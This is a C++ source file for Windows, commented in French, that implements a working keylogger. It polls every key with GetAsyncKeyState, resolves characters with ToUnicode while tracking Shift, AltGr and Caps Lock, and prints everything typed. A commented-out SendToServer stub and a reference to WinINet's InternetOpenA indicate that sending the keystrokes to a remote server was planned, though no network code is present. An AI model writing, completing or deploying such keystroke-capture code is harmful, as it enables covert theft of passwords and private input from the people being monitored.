#include <Windows.h>
#include <iostream>

// void SendToServer(const std::string& message){}

bool IsKeyPressed(int vkey) {   //Une touche est pressé ?
    return (GetAsyncKeyState(vkey) & 0x8000);   //retourne si une clés est pressé
}

int specialKey(int vkey)   
{
    switch(vkey)
    {
        case VK_RETURN:     std::cout << " [ENTER] \n" ;          return 1;  break;
        case VK_DELETE:     std::cout << " [DELETE] " ;         return 1;  break; 
        case VK_SPACE:      std::cout << " [SPACE] ";           return 1;  break;
        case VK_TAB:        std::cout << " [TAB] ";             return 1;  break;
        case VK_CONTROL:    std::cout << " [CONTROL] ";         return 1;  break;
        case VK_BACK:       std::cout << " [BACK] ";            return 1;  break;
        case VK_ESCAPE:     std::cout << " [ESCAPE] ";          return 1;  break; 
        default:                                                                                            return 0;  break;
    }
}

// Convertit un code virtuel en caractère (en tenant compte des majuscules/AltGr)
char VirtualKeyToChar(UINT vkey, bool shiftPressed, bool altGrPressed, bool capLockPressed) { //UINT vkey : convertit les clés virtuel en caractère
   
    BYTE keyboardState[256] = {0};  //Variable pour récupérér L'état du clavier 
    WCHAR buffer[2] = {0}; //Le buffer va être un tableau récupérant les touches pressé dans la fonction ToUnicode, c'est au moment ou la ligne de Tounicode est lancé que la touche es récupéré
    
    // Condition de récupération de l'Etat pour connaitre si des touches spécial sont pressé
    if (shiftPressed) keyboardState[VK_SHIFT] = 0x80;   //Si shift est pressé alors, dans la position VK_shit du tableau de clé virtuel, la touche est égale a 0x80 pour indiqué qu'elle est pressé
    if (capLockPressed) keyboardState[VK_CAPITAL] = 0x01; // 0x01, indique ici si la touche est vérrouillé 
    if (altGrPressed) {                 //AltGr est Utilisé
        keyboardState[VK_CONTROL] = 0x80;
        keyboardState[VK_MENU] = 0x80;  // Alt = VK_MENU
    }

    int result = ToUnicode(vkey, 0, keyboardState, buffer, 2, 0);
    
    if (result == 1) // Un seul caractère généré
    { 
        if(specialKey(vkey) == 0)  //La touche utilisé n'est pas special alors  == à 0
        {
            return char(buffer[0]); //static_cast<char>(buffer[0]);
        } else return '\0';
    }
    else
    {
        return '\0'; // Aucun caractère ou touche non reconnue
    }
}


int main() {
    bool wasPressed[256] = {false}; //connaitre si une touche est bien en train d'être appuyé

    while (true) {
        Sleep(10);
        for (int vkey = 0; vkey < 256; ++vkey) {    //Parcours les touches possibles à appuyer

            if (IsKeyPressed(vkey) && !wasPressed[vkey]) 
            {   //Si une touche est bien appuyé est que le tableau de touche pressé renvoie faux
                wasPressed[vkey] = true;    // alors la touche pressé du tableau devient vrai

                //Connaitre l'état du clavier pour savoir quel touche va être pressé
                bool shift = IsKeyPressed(VK_SHIFT);    //si shift est appuyé alors vrai sinon faux
                bool altGr = IsKeyPressed(VK_CONTROL) && IsKeyPressed(VK_MENU); // AltGr = Ctrl + Alt ou simplement la touche altGr
                bool capLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                
                char c = VirtualKeyToChar(vkey, shift, altGr, capLock); //c est égale a se que retourne virtualKey
                if (c != '\0') 
                {
                    std::cout << c; // VK print : << " (VKey: " << vkey << ")" ;
                } 
            }
            else if(IsKeyPressed(vkey) == false) wasPressed[vkey] = false;  //quand touche relacher alors on quitte la condition précédent et plus aucun 
        }
    }
    return 0;
}


/*
    Windows.h:
        ToUnicode: https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-tounicode
    Wininet doc:
        InternetOpenA: https://learn.microsoft.com/fr-fr/windows/win32/api/wininet/nf-wininet-internetopena

*/